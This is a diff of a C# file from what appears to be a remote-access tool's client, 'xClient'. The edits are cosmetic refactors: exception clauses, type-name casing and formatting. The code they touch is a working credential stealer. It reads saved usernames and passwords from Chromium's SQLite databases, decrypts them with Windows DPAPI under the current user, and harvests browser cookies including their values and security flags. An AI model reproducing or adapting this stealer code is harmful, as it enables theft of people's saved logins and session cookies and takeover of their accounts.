@@ -21,7 +21,7 @@ namespace xClient.Core.Recovery.Utilities
             {
                 SQLDatabase = new SQLiteHandler(datapath);
             }
-            catch (Exception)
+            catch
             {
                 return data;
             }
@@ -42,7 +42,7 @@ namespace xClient.Core.Recovery.Utilities
                     user = SQLDatabase.GetValue(i, "username_value");
                     pass = Decrypt(SQLDatabase.GetValue(i, "password_value"));
 
-                    if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(user) && pass != null)
+                    if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user) && pass != null)
                     {
                         data.Add(new RecoveredAccount
                         {
@@ -114,7 +114,7 @@ namespace xClient.Core.Recovery.Utilities
                     priority = SQLDatabase.GetValue(i, "priority") == "1";
 
 
-                    if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(name) && !String.IsNullOrEmpty(value))
+                    if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(name) && !string.IsNullOrEmpty(value))
                     {
                         data.Add(new ChromiumCookie
                         {
@@ -130,13 +130,11 @@ namespace xClient.Core.Recovery.Utilities
                             Persistent = persistent,
                             Priority = priority,
                             Browser = browser
-
                         });
                     }
                 }
-                catch (Exception)
+                catch
                 {
-
                 }
             }
 
@@ -148,7 +146,9 @@ namespace xClient.Core.Recovery.Utilities
             {
                 return null;
             }
-            byte[] decryptedData = ProtectedData.Unprotect(System.Text.Encoding.Default.GetBytes(EncryptedData), null, DataProtectionScope.CurrentUser);
+
+            byte[] decryptedData = ProtectedData.Unprotect(Encoding.Default.GetBytes(EncryptedData), null, DataProtectionScope.CurrentUser);
+
             return Encoding.UTF8.GetString(decryptedData);
         }
         public class ChromiumCookie
@@ -165,9 +165,11 @@ namespace xClient.Core.Recovery.Utilities
             public bool Persistent { get; set; }
             public bool Priority { get; set; }
             public string Browser { get; set; }
+
             public override string ToString()
             {
-                return String.Format("Domain: {1}{0}Cookie Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", Environment.NewLine, HostKey, Name, Value, Path, Expired, HttpOnly, Secure);
+                return string.Format("Domain: {1}{0}Cookie Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}",
+                       Environment.NewLine, HostKey, Name, Value, Path, Expired, HttpOnly, Secure);
             }
         }
     }
